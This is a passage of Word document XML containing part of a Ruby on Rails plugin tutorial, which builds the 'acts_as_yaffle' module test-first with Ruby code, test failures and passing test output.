            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ClassMethods</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74EE9146" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>acts_as_yaffle(options = {})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F4828D5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        # your code will go here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E535DB5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3E92A4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E8C65AA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B24D432" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EED46CD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FC1E8A2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord::Base.send :include, Yaffle::ActsAsYaffle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C27263D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can then return to the root directory (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cd ../..</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) of your plugin and rerun the tests using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</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544E0F35" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14F2BD17" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F4CE768" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    test_a_hickwalls_yaffle_text_field_should_be_last_squawk(ActsAsYaffleTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="045668A3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    NoMethodError: undefined method `yaffle_text_field' for #&lt;Class:0x000001016661b8&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01F8DF41" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        /Users/xxx/.rvm/gems/ruby-1.9.2-p136@xxx/gems/activerecord-3.0.3/lib/active_record/base.rb:1008:in `method_missing'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43997045" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        test/acts_as_yaffle_test.rb:5:in `test_a_hickwalls_yaffle_text_field_should_be_last_squawk'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7074CE9F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C27AC83" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      2) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2911F615" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    test_a_wickwalls_yaffle_text_field_should_be_last_tweet(ActsAsYaffleTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="311A4AF6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    NoMethodError: undefined method `yaffle_text_field' for #&lt;Class:0x00000101653748&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58BA9635" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        Users/xxx/.rvm/gems/ruby-1.9.2-p136@xxx/gems/activerecord-3.0.3/lib/active_record/base.rb:1008:in `method_missing'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09215D1A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        test/acts_as_yaffle_test.rb:9:in `test_a_wickwalls_yaffle_text_field_should_be_last_tweet'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FFD6CDC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18461987" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    5 tests, 3 assertions, 0 failures, 2 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51AA42D0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Getting closer… Now we will implement the code of the acts_as_yaffle method to make the tests pass.</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74DE0BE5" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BD2083F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle/acts_as_yaffle.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="139314D5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C92EED9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BE1A889" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B0B8855" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   extend ActiveSupport::Concern</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2479E266" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72EF1B66" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    included do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59FB08AC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E8888A0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26EE294F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ClassMethods</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19B3849B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>acts_as_yaffle(options = {})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16F2FE09" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        cattr_accessor :yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03085CF1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        self.yaffle_text_field = (options[:yaffle_text_field] || :last_squawk).to_s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72E22978" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="695DC8F8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DF3C3E9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BAF981D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A6B5B8A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43A39027" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord::Base.send :include, Yaffle::ActsAsYaffle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="057B4755" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you should see the tests all pass:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0319F026" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="656C3429" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1359240108"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>5 tests, 5 assertions, 0 failures, 0 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="151EA0D3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Add an Instance Method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530C68EA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This plugin will add a method named ‘squawk’ to any Active Record object that calls ‘acts_as_yaffle’. The ‘squawk’ method will simply set the value of one of the fields in the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E21B493" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To start out, write a failing test that shows the behavior you’d like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="2B444BC3" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E191D88" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/test/acts_as_yaffle_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="748EB1BC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21457681" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00DFFA6D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffleTest &lt; Test::Unit::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B96C69F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="524E7CE1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_a_hickwalls_yaffle_text_field_should_be_last_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2819B525" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "last_squawk", Hickwall.yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D470FB9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A3330C2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08E24265" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_a_wickwalls_yaffle_text_field_should_be_last_tweet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B19CDD8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "last_tweet", Wickwall.yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57FAB74D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4856EB1A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49860E06" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_hickwalls_squawk_should_populate_last_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36D4E442" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    hickwall = Hickwall.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="204576EB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    hickwall.squawk("Hello World")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23EFDF07" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "squawk! Hello World", hickwall.last_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="444BD839" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CB2E3E4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65DD6BDB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_wickwalls_squawk_should_populate_last_tweet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A7F9C14" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    wickwall = Wickwall.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C939E36" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    wickwall.squawk("Hello World")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1629234F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal "squawk! Hello World", wickwall.last_tweet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="433C4F30" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BB6B4D5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="761B3F65" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Run the test to make sure the last two tests fail with an error that contains “NoMethodError: undefined method `squawk’”, then update ‘acts_as_yaffle.rb’ to look like this:</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35B5BD22" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E5BF171" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve"># yaffle/lib/yaffle/acts_as_yaffle.rb   </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="784A3751" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52391244" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
